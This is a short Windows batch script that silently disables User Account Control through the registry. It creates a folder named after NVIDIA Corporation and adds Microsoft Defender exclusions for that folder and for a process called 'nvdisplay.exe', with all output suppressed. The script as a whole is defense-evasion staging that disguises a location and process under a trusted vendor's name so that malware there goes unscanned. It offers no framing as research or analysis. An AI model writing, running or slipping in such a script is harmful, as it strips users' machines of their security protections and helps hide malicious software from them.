@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1
echo Done.
pause